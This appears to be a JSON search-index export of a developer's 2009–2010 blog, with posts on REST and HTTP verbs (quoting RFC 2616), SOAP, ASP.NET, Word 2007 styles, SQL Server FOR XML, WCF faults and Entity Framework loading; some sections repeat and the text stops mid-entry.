6/6/2009:- What is a Service ? - Means to get the resources get some operations done What is REST ? REST is an architectural style for building resource oriented services by defining the resources that implement uniform interfaces using standard HTTP verb LIKE Get,POST,PUT and DELETE. Tenets of REST ful service:- 1) Use the URI to locate the resources. 2) Use the verbs to work with resources. Get the resource :- GET Do something with the resource :- POST,PUT,DELETE 3) The content type of the data sent to/received from the services is the object model XML,JSON 4) Result of a service request is nothing but the HTTP result code. 200- OK,404-Not found This is from Ron Jacobs:- Internet is a web of pages,right? and has following characteristics:- A) Simple and Open Addressing scheme \u2013 URI Application Protocol \u2013 HTTP Representational format \u2013 XHTML Response codes \u2013 HTTP status B) Scales best when Stateless Cached C) Hyperlinks!- and right, internet would just suck if there are no links! If you look at how we write web services,you see that we follow SOAP which in no doubt an incredible way of interoperability between the clients and the services. Now HOLD ON.. before I say something anything against SOAP,why not consider something which also does the same/similar thing in a simplistic way. This makes us look at the ways how we can make \u201cweb of services\u201d work like the \u201cweb of pages\u201d. a) How to map REST verbs with HTTP verbs b) Reading HTTP specification for the GET,POST,PUT and DELETE Have a look :- http://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html Look at sections 9.3 for GET,9.5 for POST ,9.6 for PUT and 9.7 for DELETE. Here is the following:- 9.3 GET The GET method means retrieve whatever information (in the form of an entity) is identified by the Request-URI. If the Request-URI refers to a data-producing process, it is the produced data which shall be returned as the entity in the response and not the source text of the process, unless that text happens to be the output of the process. The semantics of the GET method change to a \"conditional GET\" if the request message includes an If-Modified-Since, If-Unmodified-Since, If-Match, If-None-Match, or If-Range header field. A conditional GET method requests that the entity be transferred only under the circumstances described by the conditional header field(s). The conditional GET method is intended to reduce unnecessary network usage by allowing cached entities to be refreshed without requiring multiple requests or transferring data already held by the client. The semantics of the GET method change to a \"partial GET\" if the request message includes a Range header field. A partial GET requests that only part of the entity be transferred, as described in section 14.35 . The partial GET method is intended to reduce unnecessary network usage by allowing partially-retrieved entities to be completed without transferring data already held by the client. The response to a GET request is cacheable if and only if it meets the requirements for HTTP caching described in section 13. See section 15.1.3 for security considerations when used for forms. 9.5 POST The POST method is used to request that the origin server accept the entity enclosed in the request as a new subordinate of the resource identified by the Request-URI in the Request-Line. POST is designed to allow a uniform method to cover the following functions: - Annotation of existing resources; - Posting a message to a bulletin board, newsgroup, mailing list, or similar group of articles; - Providing a block of data, such as the result of submitting a form, to a data-handling process; - Extending a database through an append operation. The actual function performed by the POST method is determined by the server and is usually dependent on the Request-URI. The posted entity is subordinate to that URI in the same way that a file is subordinate to a directory containing it, a news article is subordinate to a newsgroup to which it is posted, or a record is subordinate to a database. The action performed by the POST method might not result in a resource that can be identified by a URI. In this case, either 200 (OK) or 204 (No Content) is the appropriate response status, depending on whether or not the response includes an entity that describes the result. If a resource has been created on the origin server, the response SHOULD be 201 (Created) and contain an entity which describes the status of the request and refers to the new resource, and a Location header (see section 14.30 ). Responses to this method are not cacheable, unless the response includes appropriate Cache-Control or Expires header fields. However, the 303 (See Other) response can be used to direct the user agent to retrieve a cacheable resource. POST requests MUST obey the message transmission requirements set out in section 8.2. See section 15.1.3 for security considerations. 9.6 PUT The PUT method requests that the enclosed entity be stored under the supplied Request-URI. If the Request-URI refers to an already existing resource, the enclosed entity SHOULD be considered as a modified version of the one residing on the origin server. If the Request-URI does not point to an existing resource, and that URI is capable of being defined as a new resource by the requesting user agent, the origin server can create the resource with that URI. If a new resource is created, the origin server MUST inform the user agent via the 201 (Created) response. If an existing resource is modified, either the 200 (OK) or 204 (No Content) response codes SHOULD be sent to indicate successful completion of the request. If the resource could not be created or modified with the Request-URI, an appropriate error response SHOULD be given that reflects the nature of the problem. The recipient of the entity MUST NOT ignore any Content-* (e.g. Content-Range) headers that it does not understand or implement and MUST return a 501 (Not Implemented) response in such cases. If the request passes through a cache and the Request-URI identifies one or more currently cached entities, those entries SHOULD be treated as stale. Responses to this method are not cacheable. The fundamental difference between the POST and PUT requests is reflected in the different meaning of the Request-URI. The URI in a POST request identifies the resource that will handle the enclosed entity. That resource might be a data-accepting process, a gateway to some other protocol, or a separate entity that accepts annotations. In contrast, the URI in a PUT request identifies the entity enclosed with the request -- the user agent knows what URI is intended and the server MUST NOT attempt to apply the request to some other resource. If the server desires that the request be applied to a different URI, it MUST send a 301 (Moved Permanently) response; the user agent MAY then make its own decision regarding whether or not to redirect the request. A single resource MAY be identified by many different URIs. For example, an article might have a URI for identifying \"the current version\" which is separate from the URI identifying each particular version. In this case, a PUT request on a general URI might result in several other URIs being defined by the origin server. HTTP/1.1 does not define how a PUT method affects the state of an origin server. PUT requests MUST obey the message transmission requirements set out in section 8.2. Unless otherwise specified for a particular entity-header, the entity-headers in the PUT request SHOULD be applied to the resource created or modified by the PUT. 9.7 DELETE The DELETE method requests that the origin server delete the resource identified by the Request-URI. This method MAY be overridden by human intervention (or other means) on the origin server. The client cannot be guaranteed that the operation has been carried out, even if the status code returned from the origin server indicates that the action has been completed successfully. However, the server SHOULD NOT indicate success unless, at the time the response is given, it intends to delete the resource or move it to an inaccessible location. A successful response SHOULD be 200 (OK) if the response includes an entity describing the status, 202 (Accepted) if the action has not yet been enacted, or 204 (No Content) if the action has been enacted but the response does not include an entity. If the request passes through a cache and the Request-URI identifies one or more currently cached entities, those entries SHOULD be treated as stale. Responses to this method are not cacheable. Although HTTP fully supports CRUD, HTML 4 only supports issuing GET and POST requests through its various elements. This limitation has held Web applications back from making full use of HTTP, and to work around it, most applications overload POST to take care of everything but resource retrieval. HTML 5, which is currently under development, plans to fix this by adding new support for PUT and DELETE. GET, HEAD, and OPTIONS are all examples of safe methods that aren\u2019t intended to have side effects. All safe methods are also idempotent, as are PUT and DELETE, so you should be able to repeat them multiple times without harm. The POST method is something of a special case. According to the HTTP specification, POST should be used to provide a representation that can be treated as a subordinate of the target resource. For example, you could POST a new blog entry to the URI representing the blog feed, causing a new blog entry to be added to the feed. POST can also be used to process a block of data such as the data transmitted by an HTML form. The actual function performed by the POST method is defined by the server. Therefore, POST cannot be considered safe or idempotent by clients. HTTP also defines a suite of standard status codes that specify the result of processing the request. Status codes are organized into ranges that mean different things. For example, status codes in the 200 range mean \u201csuccessful\u201d while status codes in the 400 range mean the client issued a bad request. Figure 2 describes each status code range and provides a few examples of common status codes.","title":"Roadmap to learn REST (Representational State Transfer)"},{"location":"2009/06/2009-06-06-roadmap-to-learn-rest-representational-state-transfer/#93-get","text":"The GET method means retrieve whatever information (in the form of an entity) is identified by the Request-URI. If the Request-URI refers to a data-producing process, it is the produced data which shall be returned as the entity in the response and not the source text of the process, unless that text happens to be the output of the process. The semantics of the GET method change to a \"conditional GET\" if the request message includes an If-Modified-Since, If-Unmodified-Since, If-Match, If-None-Match, or If-Range header field. A conditional GET method requests that the entity be transferred only under the circumstances described by the conditional header field(s). The conditional GET method is intended to reduce unnecessary network usage by allowing cached entities to be refreshed without requiring multiple requests or transferring data already held by the client. The semantics of the GET method change to a \"partial GET\" if the request message includes a Range header field. A partial GET requests that only part of the entity be transferred, as described in section 14.35 . The partial GET method is intended to reduce unnecessary network usage by allowing partially-retrieved entities to be completed without transferring data already held by the client. The response to a GET request is cacheable if and only if it meets the requirements for HTTP caching described in section 13. See section 15.1.3 for security considerations when used for forms.","title":"9.3 GET"},{"location":"2009/06/2009-06-06-roadmap-to-learn-rest-representational-state-transfer/#95-post","text":"The POST method is used to request that the origin server accept the entity enclosed in the request as a new subordinate of the resource identified by the Request-URI in the Request-Line. POST is designed to allow a uniform method to cover the following functions: - Annotation of existing resources; - Posting a message to a bulletin board, newsgroup, mailing list, or similar group of articles; - Providing a block of data, such as the result of submitting a form, to a data-handling process; - Extending a database through an append operation. The actual function performed by the POST method is determined by the server and is usually dependent on the Request-URI. The posted entity is subordinate to that URI in the same way that a file is subordinate to a directory containing it, a news article is subordinate to a newsgroup to which it is posted, or a record is subordinate to a database. The action performed by the POST method might not result in a resource that can be identified by a URI. In this case, either 200 (OK) or 204 (No Content) is the appropriate response status, depending on whether or not the response includes an entity that describes the result. If a resource has been created on the origin server, the response SHOULD be 201 (Created) and contain an entity which describes the status of the request and refers to the new resource, and a Location header (see section 14.30 ). Responses to this method are not cacheable, unless the response includes appropriate Cache-Control or Expires header fields. However, the 303 (See Other) response can be used to direct the user agent to retrieve a cacheable resource. POST requests MUST obey the message transmission requirements set out in section 8.2. See section 15.1.3 for security considerations.","title":"9.5 POST"},{"location":"2009/06/2009-06-06-roadmap-to-learn-rest-representational-state-transfer/#96-put","text":"The PUT method requests that the enclosed entity be stored under the supplied Request-URI. If the Request-URI refers to an already existing resource, the enclosed entity SHOULD be considered as a modified version of the one residing on the origin server. If the Request-URI does not point to an existing resource, and that URI is capable of being defined as a new resource by the requesting user agent, the origin server can create the resource with that URI. If a new resource is created, the origin server MUST inform the user agent via the 201 (Created) response. If an existing resource is modified, either the 200 (OK) or 204 (No Content) response codes SHOULD be sent to indicate successful completion of the request. If the resource could not be created or modified with the Request-URI, an appropriate error response SHOULD be given that reflects the nature of the problem. The recipient of the entity MUST NOT ignore any Content-* (e.g. Content-Range) headers that it does not understand or implement and MUST return a 501 (Not Implemented) response in such cases. If the request passes through a cache and the Request-URI identifies one or more currently cached entities, those entries SHOULD be treated as stale. Responses to this method are not cacheable. The fundamental difference between the POST and PUT requests is reflected in the different meaning of the Request-URI. The URI in a POST request identifies the resource that will handle the enclosed entity. That resource might be a data-accepting process, a gateway to some other protocol, or a separate entity that accepts annotations. In contrast, the URI in a PUT request identifies the entity enclosed with the request -- the user agent knows what URI is intended and the server MUST NOT attempt to apply the request to some other resource. If the server desires that the request be applied to a different URI, it MUST send a 301 (Moved Permanently) response; the user agent MAY then make its own decision regarding whether or not to redirect the request. A single resource MAY be identified by many different URIs. For example, an article might have a URI for identifying \"the current version\" which is separate from the URI identifying each particular version. In this case, a PUT request on a general URI might result in several other URIs being defined by the origin server. HTTP/1.1 does not define how a PUT method affects the state of an origin server. PUT requests MUST obey the message transmission requirements set out in section 8.2. Unless otherwise specified for a particular entity-header, the entity-headers in the PUT request SHOULD be applied to the resource created or modified by the PUT.","title":"9.6 PUT"},{"location":"2009/06/2009-06-06-roadmap-to-learn-rest-representational-state-transfer/#97-delete","text":"The DELETE method requests that the origin server delete the resource identified by the Request-URI. This method MAY be overridden by human intervention (or other means) on the origin server. The client cannot be guaranteed that the operation has been carried out, even if the status code returned from the origin server indicates that the action has been completed successfully. However, the server SHOULD NOT indicate success unless, at the time the response is given, it intends to delete the resource or move it to an inaccessible location. A successful response SHOULD be 200 (OK) if the response includes an entity describing the status, 202 (Accepted) if the action has not yet been enacted, or 204 (No Content) if the action has been enacted but the response does not include an entity. If the request passes through a cache and the Request-URI identifies one or more currently cached entities, those entries SHOULD be treated as stale. Responses to this method are not cacheable. Although HTTP fully supports CRUD, HTML 4 only supports issuing GET and POST requests through its various elements. This limitation has held Web applications back from making full use of HTTP, and to work around it, most applications overload POST to take care of everything but resource retrieval. HTML 5, which is currently under development, plans to fix this by adding new support for PUT and DELETE. GET, HEAD, and OPTIONS are all examples of safe methods that aren\u2019t intended to have side effects. All safe methods are also idempotent, as are PUT and DELETE, so you should be able to repeat them multiple times without harm. The POST method is something of a special case. According to the HTTP specification, POST should be used to provide a representation that can be treated as a subordinate of the target resource. For example, you could POST a new blog entry to the URI representing the blog feed, causing a new blog entry to be added to the feed. POST can also be used to process a block of data such as the data transmitted by an HTML form. The actual function performed by the POST method is defined by the server. Therefore, POST cannot be considered safe or idempotent by clients. HTTP also defines a suite of standard status codes that specify the result of processing the request. Status codes are organized into ranges that mean different things. For example, status codes in the 200 range mean \u201csuccessful\u201d while status codes in the 400 range mean the client issued a bad request. Figure 2 describes each status code range and provides a few examples of common status codes.","title":"9.7 DELETE"},{"location":"2009/06/2009-06-30-the-soap-vs-rest/","text":"A very interseting comparision of REST vs SOAP :- The S stands for Simple An analogy of SOAP and REST is an envelop vs a postcard (which one is bulky..huh..! :-) )","title":"The SOAP vs REST"},{"location":"2009/08/2009-08-15-accessing-user-controls-control-from-the-aspx-page%E2%80%8F/","text":"Ok, I know, I know! ?This is something you must be wondering like \"Why this guy is so scre*** up and he had to blog about this\". But I got into this problem last week and an realized that I have seen this problem and addressed this ..but just forgot about. So why not just blog about this. At least for myself :-). So, forgive me folks!! Using user control from the ASPX page:- The goal was to access the user control\u2019s control from the ASPX page. First I started looking into why that control in the user control wont be available in the page load of the ASPX page. I could have debugged it. But I thought enabling tracing in and looking into the traces would be a better idea. So I added the trace switch in the web.config (I could have done this on that page itself, but I just did that in the Web.config.). I use the following tag in the Web.config under :- Then I put the some Trace.Write statement in the Page_Load of the user control. Notice this is the method where the menu control is getting created (getting populated with the child control). I put the Trace.Write statement at the end of the Page_Load event handler. I put the Trace.Write statement in the Page_Load of the ASPX page as well at the end. Now, when I try accessing the aspx page, It would give all the tracing information right from \u201cPreInIt\u201d to \u201cRender\u201d along with all the information on the controls on this page. Notice that the Trace.Write statement from the user control is _after_the same from the ASPX page which implies that the page load of the user control is fired after the page_load of the ASPX page and hence the user control\u2019s control collection wont be available in the aspx page. Now, there is another event named _Page_PreRender_which fires after the page load and you can tweak the controls before thry get Rendered to the page. You can override that event handler as given below. Notice that in the below screenshot the user control\u2019s(UserStatus1) control(userMenu) is being accessed and is getting modified. To show that this would work, there is a Trace.Write right at the end of the end of this event handler. See the Trace.Write statement (highlighted) in between the Begin PreRender and End PreRender.","title":"Accessing user control's control from the ASPX page\u200f"},{"location":"2009/09/2009-09-06-programmatically-showing-only-the-custom-styles-in-the-style-pane-of-a-word-2007-file/","text":"The project in which I working nowadays is a content authoring and management system and makes extensive use of Word 2007. The system has two parts in context of the problem I am going to discuss about \u2013 One part where the Admin uploads a Word 2003 (.doc) file containing all the custom styles created in there into the system. Let us call this file as a word template . The second part is where the user uploads his own content files Word 2003 (.doc) files in the system. When the user uploads the content in the system, the styles from the word template gets into the to the uploaded content file (more on this later). This facilitated the styles being introduced in the system only once (or whenever the Admin wants) using the template and the same styles getting used in all the content files without having the user to recreate them in each content file. This also offered the consistency in the styles used in the content files used in the system. Problem :- When the user uploads the content and then later opens the content for editing, he was seeing the inbuilt styles as well and they wanted only the custom styles and \u201cClear Formatting\u201d option to be seen in the content file. Silly , isn\u2019t it. But this is was requirement.:-) Just to make sure we we are all clear on what an in-built and what a custom style is :- Open Word 2003 and choose Format > Styles and Formatting and what ever styles you see in the style pane are all in-built styles. And you can create a new style by clicking on the \u201cNew Style\u201d button. I created one \u201cMyCustomStyle\u201d. So this is the custom style in my file. I need to take the attention back to my following line which I mentioned earlier :- \u201cWhen the user uploads the content in the system, the styles from the word template gets into the to the uploaded content file (more on this later). \u201c The way we do this is following :- 1. Convert the template word 2003 file to word 2007 format using a third party component named \u201cAspose.Words.dll\u201d ( www.aspose.com ) 2. Convert the content word 2003 file to word 2007 using Aspose.Words.dll. Just in case you are not aware, a Word 2007 file is an archive/zip file. You can rename any Word file (.docx) to zip file and extracts its contents as if it was a Zip file. When you look into the contents of that zip file, you will see each component of the word 2007 being represented by a file. Read about this here . 3.Copy the custom styles in the style.xml of template file to the style.xml content file. 4. Convert the content word 2007 file back to word 2003 using Aspose.Words.dll. All the above four steps happen while the user attempts to open the file and when the file was ultimately opened, he sees the inbuilt styles as well along with the custom styles which is the problem. When I started looking into the problem(an you, dear reader must have realized by now for sure), it seemed that user can always filter the custom styles:- However, this is exactly what the users of the application did not want to do. So the effort of convincing them was in vain. So, first I started looking at if Aspose.Words.dll offers any API to change the filter to show only the custom styles in the word 2003 file, when we convert the content 2007 file back to 2003. It turns out that It does not and a request for incorporating that change would take months. I started looking at any other commercial product which would do a better job than Aspose and even the using Office Migration Utility(OFC) and wordconv.exe (comes with the Office compatibility pack). Those did not help either. So then I looked at if we can find something in the files in the content word 2007 archive itself. There must be something in that archive which is telling Microsoft Word 2007 which types of styles to show in the style pane. I came across an article at http://msdn.microsoft.com/en-us/library/documentformat.openxml.wordprocessing.stylepaneformatfilter(office.14).aspx Which states that For this , the w:stylePaneFormatFilter element in the settings.xml of the docx file can have the following values:- 0x1000 - Specifies that a style should be present which removes all formatting and styles from text. 0x0002 - Specifies that only styles with the customStyle attribute should be displayed in the list of document styles. So I sum the hex values above to get 1002 to show both Custom Styles and the Clear Formatting. To test this, I created a new file in Word 2007 and created a new style named \u201cMyCustomStyle\u201d in it. Then I rename that .docx file to .zip and then unzipped the same:- and extracted and navigate to Word folder to see the Settings.xml:- Opened that file and see the following structure :- I added the following node right under the root of the xml:- Updated the zip file and renamed the zip file back to docx and opened the docx file and saw only my custom style and \u201cClear All\u201d!","title":"Programmatically showing only the custom styles in the style pane of a Word 2007 file"},{"location":"2009/09/2009-09-19-procrastination/","text":"Procrastination - \u201cis a behavior which is characterized by the deferment of actions or tasks to a later time\u201d and its better explained here . A funny example is in an excellent you tube video her [youtube=http://www.youtube.com/watch?v=4P785j15Tzk&hl=en] e . The problem --------------- I truly believe that procrastinate because of most importantly the lack of focus among many other reasons. I procrastinate because I think even if I study, I wont get anything and there is no point spending time..there is too much to study. Even if I start I wont be able to study a lot and if I don't, there is no point studying. This is how I try to overcome this? --------------------------------------- - Study short items and not too many items and be aware that you have studied them and take 15 minutes in a day to remind them to yourself. - Do not think that you have studied less at any point of time. - Get the gist of the short items and get that as fast as you can. - Take frequent breaks. - Do not think of anything while studying irrespective of whatever it is about. - Think whatever you are doing now is moving you towards your goal and the goal is that short item you are focusing on and studying. N.B. :- The funny thing is I procrastinated for writing this blog entry itself for 3 days. :-) See the point I am making above. ;-)","title":"Procrastination"},{"location":"2009/09/2009-09-20-sql-server-%E2%80%93error-the-for-xml-clause-is-not-allowed-in-a-insert-statement-returning-the-result-of-a-for-xml-elements-in-a-dynamic-query-to-a-variable/","text":"Problem :- When you try to execute a dynamic query having the FOR XML AUTO like this (ignore the query itself for now, you can find the complete script at the end of this article):- DECLARE @Data2 TABLE(col xml) DECLARE @Query nvarchar(max) SELECT @Query= ' SELECT Customer.CustomerID,Address.FullAddress,Phone.PhoneNumber FROM #tempCustomer Customer JOIN #tempAddress Address ON Address.CustomerID= Customer.CustomerID JOIN #tempPhone Phone ON Phone.CustomerID= Customer.CustomerID FOR XML AUTO, ELEMENTS ' INSERT @Data2 exec (@Query) You get an error like the following \"The FOR XML clause is not allowed in a INSERT statement.\u201d From http://msdn.microsoft.com/en-us/library/aa226520(SQL.80).aspx :- The above is applicable for SQL server 2005 as well. Very annoying\u2026 However, if you have something like below, the query would get executed successfully:- SELECT @Query= ' SELECT ( SELECT Customer.CustomerID,Address.FullAddress,Phone.PhoneNumber FROM #tempCustomer Customer JOIN #tempAddress Address ON Address.CustomerID= Customer.CustomerID JOIN #tempPhone Phone ON Phone.CustomerID= Customer.CustomerID FOR XML AUTO, ELEMENTS ) ' Notice that I prefixed the query with \u2018SELECT(\u2018 and suffixed it with \u2018)\u2019. This would allow the query to execute but to return the data in text format rather than XML. However, you can have the result stored in a column of XML data type of a temporary table/variable and It would appear as if the result was XML. So we need to stuff the prefix and then the suffix in the query. Here is where the STUFF function would come to rescue. It is different from REPLACE function as it allows you to replace a specific instance of a character for a length. The complete query :- (Just run it) /* Temporary table to hold sample data. Forgive me for not using the table variable as they would be out of scope when I would use them in the dynamic query*/ if OBJECT_ID('tempdb..#tempCustomer') is not null BEGIN DROP TABLE #tempCustomer END CREATE TABLE #tempCustomer (CustomerID INT) if OBJECT_ID('tempdb..#tempAddress') is not null BEGIN DROP TABLE #tempAddress END CREATE TABLE #tempAddress (CustomerID INT,FullAddress VARCHAR(100)) if OBJECT_ID('tempdb..#tempPhone') is not null BEGIN DROP TABLE #tempPhone END CREATE TABLE #tempPhone (CustomerID INT,PhoneNumber VARCHAR(100)) /* Insert sample data*/ INSERT #tempCustomer VALUES(1) INSERT #tempAddress VALUES(1,'Some Address') INSERT #tempPhone VALUES(1,'212-111-2222') INSERT #tempCustomer VALUES(2) INSERT #tempAddress VALUES(2,'Other Address') INSERT #tempPhone VALUES(2,'212-777-8888') /* Build the dynamic query*/ DECLARE @Data2 TABLE(col xml) DECLARE @Result XML DECLARE @Query nvarchar(max) SELECT @Query= 'SELECT Customer.CustomerID,Address.FullAddress,Phone.PhoneNumber FROM #tempCustomer Customer JOIN #tempAddress Address ON Address.CustomerID= Customer.CustomerID JOIN #tempPhone Phone ON Phone.CustomerID= Customer.CustomerID FOR XML AUTO, ELEMENTS' /* There can be many 'SELECT' in the query, we need to get the last one as that would be the one which is having the FOR XML AUTO, ELEMENTS . So, reverse the string and get the first index of the 'select' and then stuff the reverse of \u2018SELECT (\u2018 and \u2018)\u2019 and reverse the result again to get the correct string*/ --PRINT @Query SELECT @Query=REVERSE( @Query) --PRINT @Query DECLARE @FirstIndexOfSelect INT SELECT @FirstIndexOfSelect = CHARINDEX(REVERSE('SELECT') , @Query ) --PRINT @FirstIndexOfSelect SELECT @Query =STUFF(@Query,@FirstIndexOfSelect,6,REVERSE('SELECT (SELECT')) SELECT @Query=REVERSE(@Query)+')' --PRINT @Query INSERT @Data2 exec (@Query) SELECT @Result =Col FROM @Data2 SELECT @Result","title":"SQL Server \u2013Error - The FOR XML clause is not allowed in a INSERT statement. - Returning the result of a FOR XML, ELEMENTS in a dynamic query to a variable"},{"location":"2009/10/2009-10-02-difference-between-rpc-and-document-centricmessage-oriented-application/","text":"With Document/Literal encoding/ Message oriented application, the payload of a message is an XML fragment that can be validated against the corresponding XML schema, for instance: <soap:Envelope xmlns:soap=\" http://schemas.xmlsoap.org/soap/envelope/\" xmlns:proc=\" http://www.somedomain.com/xyz/processed-by\" > <po:purchaseOrder orderDate=\"2008-09-22\" xmlns:po=\" http://www.somedomain.com/xyz/PO\" > Books.com 923 ... Air Guitars In Action 300 14.99 RPC (remote procedure call)/Literal more closely corresponds to remote procedure invocations. For instance, the method: public float getBookPrice(String inISBN) would correspond to the following RPC/Literal request message: <soap:Envelope xmlns:soap=\" http://schemas.xmlsoap.org/soap/envelope/\" > 0321146182 One important difference between RPC and Document web services is that with RPC web services, XML schema will only be created for complex type parameters. It is thus not possible to validate the entire XML fragment contained in the SOAP body. With Document web services, however, the XML schema needs to define the ENTIRE XML fragment contained in the SOAP body. Consequently, the entire message can be validated against the XML schema.","title":"Difference between RPC and Document-Centric/Message Oriented application"},{"location":"2009/11/2009-11-22-software-engineer-and-the-social-service/","text":"I have been working as a .NET developer for quite some time now. I always wanted to be a doctor. I thought that is the most nobel profession you can ever have. Because when your loved one is sick, you look up to that doctor after you have prayed to the god. So, if you are a doctor, you have the best opportunity to serve the human kind and the society. Now I could not be a doctor of course :-). Recently I heard Jeffery Ritcher saying that he wanted to write books because he thinks that when he write books/articles, he is helping people. Because he runs into people who say that they got a job when they read his book and they learnt how garbage collector works. So, he feels incredibly awesome that because of his book, somebody got a job and could support family and children and he helped in that. He also comes across some people who say that this software which is running in this hospital, they learnt how to work with virtual memory from his book and they put that in that software and that makes him feel that he is making a massive impact to the society with this little contribution to the hospital helping people's lives. He says that this is the reason he writes books because he is helping the world to be a better place. What a nobel thought and no doubt why he is a hero many developers like me! Now we all know that we all can't be a Jeffery Ritcher. But It gets to me this thinking that you can serve society this way (or can think some other ways), something which I never thought of. hmmm...","title":"Software engineer and the social service"},{"location":"2010/03/2010-03-20-tablediff-exe-in-sql-server-2005/","text":"Interestingly, we have a console-based TableDiff.exe in Sql Server 2005 right in our SQL server 2005 installation directory. C:\\Program Files\\Microsoft SQL Server\\90\\COM\\tablediff.exe From here . Checkout the bulleted point in green :- \u00b7 Table Difference tool allows you to discover and reconcile differences between a source and destination table or a view. Tablediff Utility can report differences on schema and data. The most popular feature of tablediff is the fact that it can generate a script that you can run on the destination that will reconcile differences between the tables. TableDiff.exe takes 2 sets of input; \u00b7 Connectivity - Provide source and destination objects and connectivity information. \u00b7 Compare Options - Select one of the compare options \u00b7 Compare schemas: Regular or Strict \u00b7 Compare using Rowcounts, Hashes or Column comparisons \u00b7 Generate difference scripts with I/U/D statements to synchronize destination to the source. I haven\u2019t tried this but seems like worth a look.. an example here ..","title":"TableDiff.exe in Sql Server 2005"},{"location":"2010/06/2010-06-13-faultexception-exception-thrown-by-the-service-is-not-caught-by-the-client-catchfaultexception/","text":"Also posted here :- Ok, I know I am missing something here. I have the following operation contract: public double DivideByZero(int x, int y) { if (y == 0) { throw new FaultException (new ArgumentException(\"Just some dummy exception\") ,new FaultReason(\"some very bogus reason\"), new FaultCode(\"007\")); } return x / y; } And following is taken from the client:- Console.WriteLine(\"Enter the x value\"); string x = Console.ReadLine(); Console.WriteLine(\"Enter the Y value\"); string y = Console.ReadLine(); try { double val = client.DivideByZero(Convert.ToInt32(x), Convert.ToInt32(y)); Console.WriteLine(\"The result is \" + val.ToString()); } catch(FaultException exp) { Console.WriteLine(\"An ArgumentException was thrown by the service \"+ exp.ToString()); } catch (Exception exp) { Console.WriteLine(exp.ToString()); } In the above case catch(FaultException exp) (the first catch block with ArgumentException in the client code) block does not get executed. However, when I remove ArgumentException to have catch(FaultException exp), the same catch block gets executed. I am not sure about this as I am throwing FaultException from my operation contract. Am I missing anything here. NOTE:- If you have a custom exception class and use that to throw and catch, It does work. Not sure why it wont work (serialize) with ArgumentException.","title":"FaultException() exception thrown by the service is not caught by the client catch(FaultException)"},{"location":"2010/08/2010-08-22-entity-framework-4-0-lazy-loading-eager-loading-and-explicit-loading/","text":"Lazy Loading Lazy loading is not a new concept and I must confess I didn\u2019t know what it is. Thanks to Entity Framework (EF) for having it because It led me to understand lazy loading concept before I know how it can be used in the EF. :-) Alright, let us take the following example:- 1: // member variable 2: private List customers= null; 3: 4: // property 5: public List Customers 6: { 7: get 8: { 9: if (customers== null) 10: customers= GetCustomers(); 11: 12: return customers; 13: } 14: } Now, anywhere in your program when you use CustomerDataSet, It sees If the customers are already loaded, If not load it (e.g from a data store). But this is not a new concept, right? Absolutely! However, the point is this concept is very important when you try to load related objects. Suppose Customers have Orders. You when you get all the customers, do you want to get all the orders placed by them? Probably not. You probably want to get the orders for customers when you need it (you are lazy here) and don't want to get all the orders for all the customers when you just wanted customers. Coming back to EF, lazy loading is enabled by default and it is controlled by the following property:- 1: contextObject.ContextOption.EnableLazyLoading where contextObject is an instance of the type of ObjectContext. By default the lazy loading is enabled in EF. So, how does it work in EF?. I generated the following model from an existing database. Before I ran the above example, I opened the Sql Server profile and started a new trace and then ran the above. Following is the output:- Eager loading:- What If we want to load all the addresses as well for all the contacts when we get the contacts. Surely It can be done. However, for this, we need to turn off the lazyLoading behavior in EF. As I said before, It is on by default. 1: context.ContextOptions.LazyLoadingEnabled = false; You just need to use \u201cInclude\u201d method on the list, in this case the contact\u2019s list and pass the path to other collection for each contact. In this case, each contact has \u201cAddresses\u201d collection, so we pass \u201cAddresses\u201d. The output is same:- Sql Profiler shows a single query getting executed :- And the query is below which gets all the contacts along with their addresses. The query results which show multiple entries for same contact id, because It is listing all the addresses for all the contacts:- Explicit (lazy) Loading:- You check for the IsLoaded property of the collection (e.g. Addresses) and if It was not loaded for a given contact, you call the Load() method to load the Addresses for a given contact. You should see the same number of same queries (same number of database trips) as you saw in case of lazy loading. So the explicit loading is nothing but the lazy loading, however, in explicit loading we explicitly load the child collections (relations) and in lazy loading, we dont have to \u201cload\u201d them, they get loaded when they are accessed.","title":"Entity Framework 4.0 : Lazy loading, Eager loading and Explicit loading"},{"location":"2010/08/2010-08-22-entity-framework-4-0-lazy-loading-eager-loading-and-explicit-loading/#lazy-loading","text":"Lazy loading is not a new concept and I must confess I didn\u2019t know what it is. Thanks to Entity Framework (EF) for having it because It led me to understand lazy loading concept before I know how it can be used in the EF. :-) Alright, let us take the following example:- 1: // member variable 2: private List customers= null; 3: 4: // property 5: public List Customers 6: { 7: get 8: { 9: if (customers== null) 10: customers= GetCustomers(); 11: 12: return customers; 13: } 14: } Now, anywhere in your program when you use CustomerDataSet, It sees If the customers are already loaded, If not load it (e.g from a data store). But this is not a new concept, right? Absolutely! However, the point is this concept is very important when you try to load related objects. Suppose Customers have Orders. You when you get all the customers, do you want to get all the orders placed by them? Probably not. You probably want to get the orders for customers when you need it (you are lazy here) and don't want to get all the orders for all the customers when you just wanted customers. Coming back to EF, lazy loading is enabled by default and it is controlled by the following property:- 1: contextObject.ContextOption.EnableLazyLoading where contextObject is an instance of the type of ObjectContext. By default the lazy loading is enabled in EF. So, how does it work in EF?. I generated the following model from an existing database. Before I ran the above example, I opened the Sql Server profile and started a new trace and then ran the above. Following is the output:-","title":"Lazy Loading"},{"location":"2010/08/2010-08-22-entity-framework-4-0-lazy-loading-eager-loading-and-explicit-loading/#eager-loading-","text":"What If we want to load all the addresses as well for all the contacts when we get the contacts. Surely It can be done. However, for this, we need to turn off the lazyLoading behavior in EF. As I said before, It is on by default. 1: context.ContextOptions.LazyLoadingEnabled = false; You just need to use \u201cInclude\u201d method on the list, in this case the contact\u2019s list and pass the path to other collection for each contact. In this case, each contact has \u201cAddresses\u201d collection, so we pass \u201cAddresses\u201d. The output is same:- Sql Profiler shows a single query getting executed :- And the query is below which gets all the contacts along with their addresses. The query results which show multiple entries for same contact id, because It is listing all the addresses for all the contacts:-","title":"Eager loading:-"},{"location":"2010/08/2010-08-22-entity-framework-4-0-lazy-loading-eager-loading-and-explicit-loading/#explicit-lazy-loading-","text":"You check for the IsLoaded property of the collection (e.g. Addresses) and if It was not loaded for a given contact, you call the Load() method to load the Addresses for a given contact. You should see the same number of same queries (same number of database trips) as you saw in case of lazy loading. So the explicit loading is nothing but the lazy loading, however, in explicit loading we explicitly load the child collections (relations) and in lazy loading, we dont have to \u201cload\u201d them, they get loaded when they are accessed.","title":"Explicit (lazy) Loading:-"},{"location":"2010/08/2010-08-25-entity-framework-4-poco-support-1-via-objectcontext/","text":"POCO stands for \u201cPlain Old CLR 